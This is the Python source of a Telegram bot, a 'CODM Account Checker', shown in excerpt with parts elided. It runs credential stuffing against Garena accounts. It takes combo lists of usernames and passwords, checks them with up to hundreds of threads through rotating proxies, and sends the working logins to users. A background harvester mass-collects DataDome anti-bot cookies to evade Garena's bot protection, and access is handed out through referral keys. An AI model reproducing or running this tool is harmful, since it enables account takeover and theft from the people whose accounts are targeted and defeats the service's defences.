#!/usr/bin/env python3
# =============================================================================
#  main.py  —  CODM Telegram Checker Bot  v5.8
#  Engine: a.py  (imported inline, no shim)
#  Access: referral-only. 5 referrals = 1-day key. No free starter.
# =============================================================================

import os, sys, time, json, logging, random, re
import secrets, string, signal, threading
...
# Strip engine root handlers so main.py's logging.basicConfig wins
_root_log = logging.getLogger()
for _h in list(_root_log.handlers):
    _root_log.removeHandler(_h)

_ENG_HERE    = os.path.dirname(os.path.abspath(__file__))
_PROXY_FILE  = os.path.join(_ENG_HERE, "proxies.txt")
_COOKIE_FILE = os.path.join(_ENG_HERE, "fresh_cookie.txt")
_BANNED_FILE = os.path.join(_ENG_HERE, "banned_cookies.txt")

CODM_REGIONS       = _engine.CODM_REGIONS
sanitize_string    = _engine.sanitize_string
clean_account_line = _engine.clean_account_line


class ProxyManager(_engine.ProxyManager):
    def __init__(self, proxy_file=None):
        if proxy_file is None:
            proxy_file = _PROXY_FILE
        # Base engine may be checker.py (no-kwarg __init__) or a.py (takes proxy_file).
        # Try the kwarg form first, fall back to no-arg, then force-load our path.
        _loaded_ok = False
        try:
            super().__init__(proxy_file=proxy_file)
            _loaded_ok = True
        except TypeError:
            try:
                super().__init__()
            except TypeError:
                # Last resort — construct base state manually.
                self.proxies = []
                self._index  = 0
        # If we got here with an empty list and our proxy file exists, load it.
        if not getattr(self, "proxies", None) and os.path.exists(proxy_file):
            try:
                # Use the base's loader if it's exposed; otherwise inline parse.
...
class CookieManager(_engine.CookieManager):
    def __init__(self):
        # Engine's __init__ reads cwd-relative files; we want script-relative.
        self.banned_cookies = set()
        self.live_cookies   = deque()
        self.lock           = Lock()
        if os.path.exists(_BANNED_FILE):
            try:
                with open(_BANNED_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    self.banned_cookies = {l.strip() for l in f if l.strip()}
            except Exception:
                pass
        if os.path.exists(_COOKIE_FILE):
            try:
                with open(_COOKIE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        c = line.strip()
                        if c and c not in self.banned_cookies:
                            self.live_cookies.append(c)
            except Exception:
                pass

    def count(self) -> int:
        return len(self.live_cookies)

    @property
    def banned(self):
        return self.banned_cookies

    def reload(self):
        existing = set(self.live_cookies)
        ...
        try:
            with open(_COOKIE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    c = line.strip()
                    if not c or c in self.banned_cookies or c in existing:
                        continue
                    self.live_cookies.append(c)
                    existing.add(c)
        except Exception:
    ...
    def save_cookie(self, datadome_value):
        ...
        formatted = val if val.startswith("datadome=") else f"datadome={val}"
        with self.lock:
            if formatted in self.banned_cookies or formatted in self.live_cookies:
                return False
            self.live_cookies.append(formatted)
            threading.Thread(
                target=self._append_to_file,
                args=("fresh_cookie.txt", formatted),
                daemon=True,
            ).start()
            return True

    def mark_banned(self, cookie_value):
        formatted = cookie_value if "datadome=" in cookie_value else f"datadome={cookie_value}"
        with self.lock:
            if formatted in self.live_cookies:
                try:
                    self.live_cookies.remove(formatted)
                except ValueError:
                    pass
            if formatted not in self.banned_cookies:
                self.banned_cookies.add(formatted)
                threading.Thread(
                    target=self._append_to_file,
                    args=("banned_cookies.txt", formatted),
                    daemon=True,
                ).start()

    def _append_to_file(self, filename, content):
        try:
            path = filename if os.path.isabs(filename) else os.path.join(_ENG_HERE, filename)
...
class LiveStats(_engine.LiveStats):
    """Engine LiveStats + snap()/processed()/.total that main.py expects."""
    def __init__(self):
        super().__init__()
    ...
    @property
    def total(self):
        return int(getattr(self, "total_accounts", 0) or 0)

    @total.setter
    def total(self, v):
        self.total_accounts = int(v or 0)
    ...
    def snap(self) -> dict:
        ...
        return {
            ...
            "clean":         s.get("clean", 0),
            "not_clean":     s.get("not_clean", 0),
            "has_codm":      s.get("has_codm", 0),
            "no_codm":       s.get("no_codm", 0),
            "highest_level": s.get("highest_clean_level", 0),
            "highest_shell": s.get("highest_shell", 0),
            "region_counts": s.get("region_distribution", {}) or {},
        }

    def processed(self) -> int:
        return self.get_processed_count()


class ResultsManager(_engine.ResultsManager):
    """Engine ResultsManager + user_id routing + .base + .get_result_files()."""
    def __init__(self, combo_file_path, user_id=None, create_dirs=True):
        super().__init__(combo_file_path)
        if user_id is not None:
            stem = Path(str(combo_file_path)).stem
            self.base_dir = Path("Results") / str(user_id) / f"output_{stem}_{self.timestamp}"
    ...
    def add_account(self, account_data):
        if self._on_result is not None:
            try:
                self._on_result(account_data)
            except Exception:
                pass
        super().add_account(account_data)

    def get_result_files(self) -> dict:
        out = {}
        if not self.base_dir.exists():
            return out
        for fp in sorted(self.base_dir.glob("*.txt")):
            out[fp.stem] = fp
        for sub in ("Country", "Level", "Games", "Garena Shells"):
            sd = self.base_dir / sub
            if sd.exists():
                for fp in sorted(sd.glob("*.txt")):
                    out[f"{sub}/{fp.stem}"] = fp
        return out


def get_user_results_dir(user_id) -> str:
    d = Path("Results") / str(user_id)
    d.mkdir(parents=True, exist_ok=True)
    return str(d)


def run_check(item, accounts, state,
              send_hit, send_final_stats, send_result_files,
              log_terminal, on_complete):
    ls      = state.live_stats
    ...
    _engine._suppress_ip_prints = True
    _engine._ip_block_callback  = None
    if hasattr(_engine, "_TG_HOOK"):
        _engine._TG_HOOK = None

    # Ensure CHECK_OTHER_GAMES stays False in the engine for bot use
    _engine.CHECK_OTHER_GAMES = False
    ...
    def _on_result(ad):
        try:
            ...
            pass
        if not ad.get("is_error") and ad.get("has_codm"):
            try:
                send_hit(item.chat_id, ad)
            except Exception:
                pass

    rm._on_result = _on_result
    ...
    def _get_resources():
        if not hasattr(_tls, "sess"):
            ...
            _tls.dd   = _engine.DataDomeManager()

            if pm is not None and pm.is_loaded():
                px = pm.get_next()
                if px:
                    _tls.sess.proxies.update(px)

            cks = cm.get_valid_cookies()
            if cks:
                _engine.applyck(_tls.sess, "; ".join(cks))
                for part in cks[-1].split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        v = part.split("=", 1)[1].strip()
                        if v:
                            _tls.dd.set_datadome(v)
                            _tls.sess.cookies.set("datadome", v, domain=".garena.com")
                        break
            else:
                px = dict(_tls.sess.proxies) if _tls.sess.proxies else None
                try:
                    dd = _engine.get_datadome_cookie(_tls.sess, proxies=px)
                    if dd:
                        raw = dd.split("=", 1)[1] if "=" in dd else dd
                        raw = raw.split(";", 1)[0].strip()
                        if raw:
                            _tls.dd.set_datadome(raw)
                            _tls.sess.cookies.set("datadome", raw, domain=".garena.com")
                except Exception:
                    pass
        return _tls.sess, _tls.dd
    ...
    def _work(ap):
        ...
        for _ in range(3):
            if stop_ev.is_set():
                return
            try:
                sess, dd = _get_resources()
                result = _engine.processaccount(
                    sess, account, password,
                    cm, dd, ls, rm,
                    auto_remove=False,
                    proxy_manager=(pm if (pm is not None and pm.is_loaded()) else None),
                )
                ...
                err = {"account": account, "password": password,
                       "is_error": True, "error_reason": f"{type(e).__name__}: {e}"}
                try:
                    ls.update_stats(is_error=True)
                    rm.add_account(err)
                except Exception:
                    pass
                return
    ...
    try:
        workers = max(1, int(item.threads))
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(_work, ap) for ap in accounts]
        ...
        logger.error(f"[run_check] {e}", exc_info=True)
    finally:
        try:
            send_final_stats(item.chat_id, ls, stop_ev.is_set())
        except Exception:
            pass
        try:
            send_result_files(item.chat_id, rm)
        except Exception:
            pass
        try:
            state.finish()
...
FRESH_COOKIE_FILE = os.path.join(SCRIPT_DIR, "fresh_cookie.txt")
...
DEFAULT_THREADS         = 50
REFERRALS_NEEDED        = 5
REFERRAL_REWARD_SECONDS = 86400   # 1 day

COOKIE_POOL_TARGET     = 500
COOKIE_POOL_MIN        = 100
COOKIE_POOL_BATCH      = 50
COOKIE_HARVEST_WORKERS = 20
COOKIE_HARVEST_TIMEOUT = 60
COOKIE_POOL_IDLE_WAIT  = 5
COOKIE_POOL_LOW_WAIT   = 2
...
_COMBO_ACTION_TTL   = 15 * 60

_cookie_pool_lock      = Lock()
_cookie_harvester_stop = Event()
_cookie_harvester_stats = {
    "total_harvested": 0,
    "total_added":     0,
    "cycles":          0,
    "last_error":      None,
...
# =============================================================================
#   FRESH COOKIE HARVESTER
# =============================================================================
_DATADOME_URL = "https://datadome.garena.com/js/"
_DATADOME_HEADERS = {
...
def _fetch_one_datadome(session=None):
    s = session or requests.Session()
    try:
        r = s.post(
            _DATADOME_URL,
            headers=_DATADOME_HEADERS,
            data=_DATADOME_PAYLOAD,
            timeout=25,
        )
        if r.status_code == 200:
            try:
                ...
                data = None
            if isinstance(data, dict) and data.get("status") == 200 and "cookie" in data:
                cookie = data["cookie"]
                if "datadome=" in cookie:
                    val = cookie.split("datadome=")[1].split(";")[0].strip()
                else:
                    val = cookie.split(";")[0].strip()
                if val:
                    return val if val.startswith("datadome=") else f"datadome={val}"
        dd = r.cookies.get("datadome")
        if dd:
            return dd if dd.startswith("datadome=") else f"datadome={dd}"
    except Exception:
        pass
    return None

def _count_fresh_cookies() -> int:
    try:
        if not os.path.exists(FRESH_COOKIE_FILE):
            return 0
        with _cookie_pool_lock:
            with open(FRESH_COOKIE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                return sum(1 for l in f if l.strip())
    except Exception:
        return 0

def _append_cookies_atomic(new_lines):
    if not new_lines:
        return 0
    with _cookie_pool_lock:
        existing_ordered = {}
            ...
            try:
                with open(FRESH_COOKIE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    for l in f:
                        l = l.strip()
                        if l:
                            existing_ordered[l] = None
            except Exception as e:
                logger.error(f"[COOKIES] read existing failed: {e}")

        added = 0
        for line in new_lines:
            line = line.strip()
            if not line or line in existing_ordered:
                continue
            existing_ordered[line] = None
            added += 1

        if added == 0:
            return 0

        tmp = FRESH_COOKIE_FILE + ".tmp"
        try:
            with open(tmp, "w", encoding="utf-8", newline="\n") as f:
                for line in existing_ordered.keys():
                    f.write(line + "\n")
            os.replace(tmp, FRESH_COOKIE_FILE)
        except Exception as e:
            logger.error(f"[COOKIES] atomic write failed: {e}")
            try:
...
def harvest_cookies(target_count=COOKIE_POOL_BATCH,
                    max_workers=COOKIE_HARVEST_WORKERS,
                    timeout=COOKIE_HARVEST_TIMEOUT):
    collected = []
    seen = set()
    collected_lock = Lock()
    start_ts = time.time()
    max_attempts = max(target_count * 3, target_count + 10)

    def _task(_i):
        for _attempt in range(2):
            if time.time() - start_ts > timeout:
                return None
            val = _fetch_one_datadome()
            if val:
                return val
            time.sleep(0.2)
        return None
    ...
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(_task, i) for i in range(max_attempts)]
        try:
...
def fetch_fresh_cookies(target_override=None) -> int:
    target  = int(target_override) if target_override else int(
        cfg.get("cookie_pool_batch", COOKIE_POOL_BATCH)
    )
    workers = int(cfg.get("cookie_harvest_workers", COOKIE_HARVEST_WORKERS))
    timeout = int(cfg.get("cookie_harvest_timeout", COOKIE_HARVEST_TIMEOUT))
    target  = max(1, min(5000, target))
    workers = max(1, min(200,  workers))
    timeout = max(10, min(600, timeout))

    try:
        cookies = harvest_cookies(target_count=target, max_workers=workers, timeout=timeout)
    except Exception as e:
        logger.error(f"[COOKIES] harvest error: {e}")
        with _cookie_pool_lock:
            _cookie_harvester_stats["last_error"] = str(e)
        return 0

    if not cookies:
        return 0
    return _append_cookies_atomic(cookies)

def _reload_live_cookie_manager():
    try:
        cm = STATE.cookie_mgr
        if cm is None:
            return
        for method_name in ("reload", "load", "reload_from_file", "refresh"):
            method = getattr(cm, method_name, None)
            if callable(method):
                try:
                    method()
                    logger.debug(f"[COOKIES] Live CookieManager reloaded via {method_name}().")
                    return
                except Exception:
                    continue
        try:
            STATE.cookie_mgr = CookieManager()
            logger.debug("[COOKIES] Live CookieManager recreated.")
        except Exception:
            pass
    except Exception as e:
        logger.debug(f"[COOKIES] reload live manager error: {e}")

def _cookie_harvester_loop():
    logger.info("[COOKIES] Background harvester started.")
    target  = int(cfg.get("cookie_pool_target",  COOKIE_POOL_TARGET))
    minimum = int(cfg.get("cookie_pool_min",     COOKIE_POOL_MIN))
    batch   = int(cfg.get("cookie_pool_batch",   COOKIE_POOL_BATCH))
    workers = int(cfg.get("cookie_harvest_workers", COOKIE_HARVEST_WORKERS))
    timeout = int(cfg.get("cookie_harvest_timeout", COOKIE_HARVEST_TIMEOUT))

    target  = max(10,  min(100000, target))
    minimum = max(1,   min(max(target - 1, 1), minimum))
    batch   = max(1,   min(5000, batch))
    workers = max(1,   min(200, workers))
    timeout = max(10,  min(600, timeout))

    logger.info(
        f"[COOKIES] Pool config → target={target}  min={minimum}  "
        f"batch={batch}  workers={workers}  timeout={timeout}s"
    )

    while not _cookie_harvester_stop.is_set():
        try:
            current = _count_fresh_cookies()
            if current < target:
                need = target - current
                fetch_n = min(batch, need)
                if fetch_n > 0:
                    if current < minimum:
                        logger.warning(
                            f"[COOKIES] Pool critically low ({current}/{target}) — "
                            f"harvesting {fetch_n}..."
                        )
                    else:
                        logger.info(
                            f"[COOKIES] Topping up pool ({current}/{target}) — "
                            f"harvesting {fetch_n}..."
                        )
                    added = fetch_fresh_cookies(target_override=fetch_n)
                    total = _count_fresh_cookies()
                    with _cookie_pool_lock:
                        _cookie_harvester_stats["total_harvested"] += fetch_n
                        _cookie_harvester_stats["total_added"]     += added
                        _cookie_harvester_stats["cycles"]          += 1
                        _cookie_harvester_stats["last_run_ts"]     = time.time()
                        if added > 0:
                            _cookie_harvester_stats["last_error"]  = None
                    if added > 0:
                        logger.info(f"[COOKIES] +{added} new cookies → pool now {total}.")
                        _reload_live_cookie_manager()
                wait = COOKIE_POOL_LOW_WAIT if current < minimum else COOKIE_POOL_IDLE_WAIT
            else:
                wait = COOKIE_POOL_IDLE_WAIT
            _cookie_harvester_stop.wait(wait)
        except Exception as e:
            logger.error(f"[COOKIES] harvester loop error: {e}")
            with _cookie_pool_lock:
                _cookie_harvester_stats["last_error"] = str(e)
            _cookie_harvester_stop.wait(5)

    logger.info("[COOKIES] Background harvester stopped.")

def ensure_fresh_cookies() -> bool:
    current = _count_fresh_cookies()
    if current > 0:
        logger.info(f"[COOKIES] fresh_cookie.txt already has {current} cookies.")
        return True
    logger.info("[COOKIES] Pool empty — initial harvest (this may take a moment)...")
    added = fetch_fresh_cookies()
    total = _count_fresh_cookies()
    if added > 0 or total > 0:
        logger.info(f"[COOKIES] Initial harvest done → pool = {total}.")
        return True
    logger.warning("[COOKIES] Initial harvest produced 0 cookies.")
    return False

def _ensure_pool_for(account_count: int) -> None:
    current = _count_fresh_cookies()
    if current >= account_count:
        return
    logger.warning(
        f"[COOKIES] Pool has {current} but check needs {account_count} — "
        f"triggering urgent background harvest."
    )
    def _bg():
        try:
            need = max(account_count - _count_fresh_cookies(), COOKIE_POOL_BATCH)
            added = fetch_fresh_cookies(target_override=min(need, 2000))
            total = _count_fresh_cookies()
            logger.info(f"[COOKIES] Urgent harvest +{added} → pool now {total}.")
            if added > 0:
                _reload_live_cookie_manager()
        except Exception as e:
            logger.error(f"[COOKIES] urgent harvest error: {e}")
    Thread(target=_bg, daemon=True, name="CookieUrgentHarvest").start()
...
def get_key_expiry(user_id: int):
    if user_id in ADMIN_IDS:
...
def record_referral(referrer_id: int, new_user_id: int):
    ...
    with _users_lock:
        ...
        if pending >= REFERRALS_NEEDED:
            key = gen_key(duration_seconds=REFERRAL_REWARD_SECONDS, created_by=referrer_id)
            if key:
                if activate_key(referrer_id, key):
                    ...
                    users[ruid].setdefault("referral_log", []).append(
                        f"{datetime.now().isoformat()}: Earned 1d key for {REFERRALS_NEEDED} referrals"
                    )
        save_users(users)
        return bonus_earned
...
#   STATS TEXT BUILDERS
# =============================================================================
def build_stats_text(ls=None, done: bool = False, stopped: bool = False) -> str:
...
def _process_next_queue():
    ...
    try:
        ...
        if not accounts:
            ...
            _process_next_queue()
            return
        _ensure_pool_for(len(accounts))
        STATE.begin(next_item)
        STATE.set_total(len(accounts))
        pm  = STATE.proxy_mgr
        cookies_now = _count_fresh_cookies()
        msg = bot.send_message(
            ...
            f"<b>Cookies:</b>  {cookies_now} (auto-refreshing)\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
...
def cmd_start(message):
            ...
            if bonus_earned:
                try:
                    bot.send_message(
                        ...
                        f"<b>+1 Day Free Key</b> has been added to your account.\n\n"
    ...
    if uid in ADMIN_IDS:
        ...
        try:
            ...
            if exp_dt > datetime.now():
                ...
                key_status = "⚠️ <b>Key expired</b> — use /activate or earn via referrals"
        except Exception:
            key_status = "ℹ️ Key status unknown"
    else:
        key_status = (
            "🆓 <b>No active key</b>\n"
            f"Invite <b>{REFERRALS_NEEDED}</b> users via /referral to earn a <b>1-day key</b>, "
            f"or ask an admin for a key."
        )
    ...
    bot.send_message(
        ...
        f"• Earn access: <b>{REFERRALS_NEEDED} refs = 1-day key</b>\n\n"
        f"📢 Required Channels:\n"
        + "\n".join(f"• {CHANNEL_LINKS[ch]}" for ch in CHANNEL_IDS) +
        f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
...
def cmd_help(message):
    ...
    lines = [
        ...
        "",
        "<b>🎁 Access</b>",
        f"• <b>{REFERRALS_NEEDED} referrals = 1-day key</b> (see /referral)",
        "• Or ask an admin for a key",
        "",
    ...
    if is_admin(message.from_user.id):
        lines += [
            ...
            "<b>/refreshcookies</b>                          — Force extra harvest now",
        ]
...
def cmd_referral(message):
    ...
    if total_count == 0:
        ...
        status_msg = f"Invite {needed_more} more user(s) to earn a 1-day key!"
    ...
    bot.send_message(
        ...
        f"<b>+1 Day Free Key</b> added to your account!\n\n"
        f"{status_msg}",
        parse_mode="HTML",
        reply_markup=markup,
...
def cmd_mykey(message):
    ...
    if not expiry:
        bot.send_message(
            message.chat.id,
            "🔐 <b>No active key.</b>\n\n"
            f"Earn a <b>1-day key</b> by inviting <b>{REFERRALS_NEEDED}</b> users — see /referral.\n"
            f"Or ask an admin for a key.",
            parse_mode="HTML",
        )
        return
...
def cmd_proxies(message):
    ...
    bot.send_message(
        message.chat.id,
        f"<b>⬡ Proxy Info</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>File:</b>    <code>{_PROXY_FILE}</code>\n"
...
def cmd_cookies(message):
    ...
    fresh_exists = os.path.exists(FRESH_COOKIE_FILE)
    fresh_size   = 0
    fresh_mtime  = "—"
    fresh_lines  = _count_fresh_cookies()
    if fresh_exists:
        try:
            fresh_size = os.path.getsize(FRESH_COOKIE_FILE)
            fresh_mtime = datetime.fromtimestamp(
                os.path.getmtime(FRESH_COOKIE_FILE)
            ).strftime("%Y-%m-%d %H:%M:%S")
        except Exception:
            pass

    target = int(cfg.get("cookie_pool_target", COOKIE_POOL_TARGET))
    pool_pct = int(min(fresh_lines / max(target, 1) * 100, 100))
    bar_w = 20
    bar = "█" * int(pool_pct / 100 * bar_w) + "░" * (bar_w - int(pool_pct / 100 * bar_w))

    with _cookie_pool_lock:
        st = dict(_cookie_harvester_stats)

    last_run = "—"
    if st.get("last_run_ts"):
        last_run = datetime.fromtimestamp(st["last_run_ts"]).strftime("%H:%M:%S")

    bot.send_message(
        message.chat.id,
        f"<b>🍪 Cookie Info</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>File:</b>    <code>{COOKIE_FILE}[/dim]</code>\n"
        f"<b>Live:</b>    {cm.count()}\n"
        f"<b>Banned:</b>  {len(cm.banned)}\n"
        f"<b>Status:</b>  {'✅ Loaded' if cm.count() else '⚠️ Empty'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>fresh_cookie.txt</b>\n"
        f"<b>Path:</b>    <code>{FRESH_COOKIE_FILE}</code>\n"
        f"<b>Exists:</b>  {'✅ Yes' if fresh_exists else '❌ No'}\n"
        f"<b>Cookies:</b> {fresh_lines}\n"
        f"<b>Size:</b>    {fresh_size} bytes\n"
        f"<b>Updated:</b> {fresh_mtime}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Auto-harvester (background)</b>\n"
        f"<b>Pool:</b>    <code>{bar}</code> {pool_pct}% of {target}\n"
        f"<b>Cycles:</b>  {st.get('cycles', 0)}\n"
        f"<b>Added:</b>   {st.get('total_added', 0)} total\n"
...
def cmd_mycheck(message):
    ...
    if uid in ADMIN_IDS:
        ...
        key_status = "🆓 No active key — earn via /referral"
...
def _send_listusers(chat_id):
    ...
    for uid, u in list(users.items())[:20]:
        ...
        refs = u.get("referral_count", 0) or 0
...
def cmd_admin(message):
    ...
    markup.add(
        ...
        types.InlineKeyboardButton("🍪 Harvest Now", callback_data="adm:refreshcookies"),
    ...
    with _cookie_pool_lock:
        st = dict(_cookie_harvester_stats)
    fresh_line = (
        f"\n<b>fresh_cookie:</b> {fresh_lines}/{target} "
        f"(cycles: {st.get('cycles', 0)})"
    )
...
def cb_admin(call):
    ...
    if action == "stats":
    ...
    elif action == "refreshcookies":
        bot.send_message(
            call.message.chat.id,
            "🍪 <b>Harvesting a fresh batch now…</b>\n"
            "This runs in addition to the background auto-harvester.",
            parse_mode="HTML",
        )
        added = fetch_fresh_cookies()
        total = _count_fresh_cookies()
        if added > 0:
            ...
            bot.send_message(
                call.message.chat.id,
                f"✅ <b>Harvest done.</b> +{added} new → pool = <b>{total}</b>.",
                parse_mode="HTML",
            )
        else:
            bot.send_message(
                call.message.chat.id,
                f"⚠️ <b>No new cookies this cycle.</b> Pool = <b>{total}</b>.\n"
                f"The background harvester will keep retrying.",
                parse_mode="HTML",
            )
...
@bot.message_handler(commands=["refreshcookies"])
def cmd_refreshcookies(message):
    if not admin_only(message):
        return
    msg = bot.send_message(
        message.chat.id,
    ...
    if added > 0:
        ...
        bot.edit_message_text(
            f"✅ <b>Harvest done.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Added:</b>  +{added} new cookies\n"
            f"<b>Pool:</b>   <b>{total}</b> total in fresh_cookie.txt",
        ...
        bot.edit_message_text(
            f"⚠️ <b>No new cookies this cycle.</b>\n"
            f"<b>Pool:</b> <b>{total}</b> total.\n"
            f"The background harvester will keep retrying.",
            chat_id=message.chat.id,
            message_id=msg.message_id,
            parse_mode="HTML",
...
def main():
    ...
    console.print()
    console.print(Panel(
        Text("CODM Account Checker Bot  v5.8", style="bold bright_magenta") +
    ...
    console.print(Panel(
        ...
        f"[bright_cyan]⬡[/bright_cyan]  Engine:   [dim]a.py[/dim]\n"
        f"[bright_cyan]⬡[/bright_cyan]  Access:   [dim]referral-only (5 refs = 1-day key)[/dim]",
        border_style="bright_cyan", box=ROUNDED, title="[bold]Config[/bold]",
    ))

    console.print("  [bright_cyan]⬡[/bright_cyan]  [dim]Seeding fresh_cookie.txt...[/dim]")
    try:
        ensure_fresh_cookies()
        current = _count_fresh_cookies()
        if current > 0:
            console.print(
                f"  [bright_green]✔[/bright_green]  [dim]Cookie pool ready "
                f"({current} cookies)[/dim]"
            )
        else:
            console.print(
                "  [yellow]⚠[/yellow]  [dim]Cookie pool empty — "
                "background harvester will fill it[/dim]"
            )
    except Exception as e:
        console.print(f"  [yellow]⚠[/yellow]  [dim]Cookie seed error: {e}[/dim]")

    try:
        harvester = Thread(
            target=_cookie_harvester_loop,
            daemon=True,
            name="CookieHarvester",
        )
        harvester.start()
        console.print(
            "  [bright_green]✔[/bright_green]  [dim]Background cookie harvester running "
            "(auto-refresh for every account)[/dim]"
        )
    except Exception as e:
        console.print(f"  [yellow]⚠[/yellow]  [dim]Harvester start error: {e}[/dim]")
    ...
    console.print(
        ...
        f"  [dim]{cm.count()} cookies (live manager)[/dim]"
    )
